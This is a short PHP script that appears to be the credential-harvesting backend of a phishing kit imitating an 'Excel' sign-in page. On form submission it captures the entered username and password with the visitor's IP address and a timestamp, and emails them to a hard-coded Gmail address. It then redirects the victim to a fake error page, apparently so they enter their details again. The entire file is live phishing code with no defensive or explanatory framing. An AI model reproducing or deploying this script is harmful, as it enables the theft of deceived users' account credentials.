<?php
	if(array_key_exists('save', $_POST))
	{
		//echo "zaa";
		$username = $_POST['userid'];
		$password = $_POST['Password'];


		$email = "temi03351@gmail.com";

		$ip = $_SERVER['REMOTE_ADDR']?:($_SERVER['HTTP_X_FORWARDED_FOR']?:$_SERVER['HTTP_CLIENT_IP']);

		$msg = "Username: $username | ";
		//$msg .= "<p>&nbsp;</p>";
		$msg .= "Password: $password | ";
		//$msg .= "<p>&nbsp;</p>";
		$msg .= "IP: $ip | ";
		//$msg .= "<p>&nbsp;</p>";
		$msg .= "Date:" . date('d-m-Y h:i:s');

		mail($email,"Excel",$msg);

		header('Location: index.php?er=1');

	}
?>